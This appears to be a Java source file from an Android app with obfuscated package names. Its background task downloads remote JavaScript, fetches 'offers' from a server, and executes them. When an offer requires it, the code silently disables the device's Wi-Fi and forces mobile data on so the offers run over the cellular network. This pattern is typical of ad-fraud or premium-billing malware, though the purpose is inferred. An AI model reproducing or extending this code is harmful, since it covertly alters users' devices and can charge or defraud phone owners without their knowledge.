package mklw.aot.zxjn.t;

import android.annotation.SuppressLint;
import android.os.AsyncTask;

import java.util.ArrayList;
import java.util.List;

import mklw.aot.zxjn.m.Ma;
import mklw.aot.zxjn.s.AgentService;
import mklw.aot.zxjn.u.JsUtil;
import mklw.aot.zxjn.u.LinkUtil;
import mklw.aot.zxjn.u.Ulog;
import mklw.aot.zxjn.u.XmlShareUtils;

public class T_link extends AsyncTask<Void, Integer, Ma> {

    private AgentService agentService;
    private List<Ma> mList = null;

    public T_link(AgentService org) {
        this.agentService = org;
    }

    @Override
    protected Ma doInBackground(Void... params) {
        mList = new ArrayList<>();

        if (JsUtil.getInstance(agentService).check_d_js_time() && !XmlShareUtils.checkBlackList(agentService)) {
            if (JsUtil.getInstance(agentService).getJsCacheStatus() != JsUtil.JS_CACHE_STATUS_DOING) {

                //                    Ulog.w("执行offer前满足条件先下载js");
                //                    Ulog.show("download js before execute offer");

                Ulog.show("d j");

                JsUtil.getInstance(agentService).init();

                if (JsUtil.getInstance(agentService).getJsCacheStatus() == JsUtil.JS_CACHE_STATUS_FAIL) {

                    //                        Ulog.w("下载失败不往下执行offer");
                    //                        Ulog.w("download fail return");

                    return null;
                }
            } else {
                //                    Ulog.w("js正在下载中,不执行offer");
                //                    Ulog.w("js downloading..");
                return null;
            }
        }

        Ma offer = LinkUtil.get_one_offer(agentService);

        if (offer == null) {
//     Ulog.show("数据为空");
            return null;
        }

        if (offer.getAllow_network() == 1) {
            //                Ulog.w("服务中执行: 只支持GPRS");
            //                Ulog.show("only gprs");
            if (XmlShareUtils.getWifiStatus(agentService)) {
                if (JsUtil.getInstance(agentService).getJsCacheStatus() == JsUtil.JS_CACHE_STATUS_DOING) {
                    //                        Ulog.w("正在下载js或缓存不做执行offer,不做关闭wifi操作");
                    //                        Ulog.show("js downloading,do not close wifi");
                    return null;
                }
                //                    Ulog.w("服务中执行: 判断wifi为开启状态 做关闭");
                //                    Ulog.show("do close wifi");
                //关闭wifi
                XmlShareUtils.closeWifi(agentService);
                try {
                    Thread.sleep(5000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }

            if (!XmlShareUtils.getMobileStatus(agentService, null)) {
                //                    Ulog.w("服务中执行:GPRS为关闭状态，做开启操作");
                //                    Ulog.show("open gprs");
                XmlShareUtils.setNetState(agentService, "setMobileDataEnabled", true);
                try {
                    Thread.sleep(10000);
                } catch (InterruptedException e) {
                    e.printStackTrace();
                }
            }
        }

        mList = LinkUtil.getOfferList(agentService, offer);

        //        Ulog.w("根据这个网络查询数据大小：" + mList.size());
        //        Ulog.show("search size：" + mList.size());
        //
        //        Log.e("love", offer.getOffer_id() + "-" + offer.getSub_platform_id());
        //        for (int i = 0; i < mList.size(); i++) {
        //            Log.e("love", mList.get(i).getOffer_id() + "---" + mList.get(i).getSub_platform_id());
        //        }

        return offer;
    }

    @SuppressLint("SimpleDateFormat")
    @Override
    protected void onPostExecute(Ma offer) {
        super.onPostExecute(offer);

        agentService.haveLink(mList, offer);

        if (offer == null) {
            //   Ulog.w("没有查找到数据");
            //   Ulog.show("no data");
            return;
        }

    }
}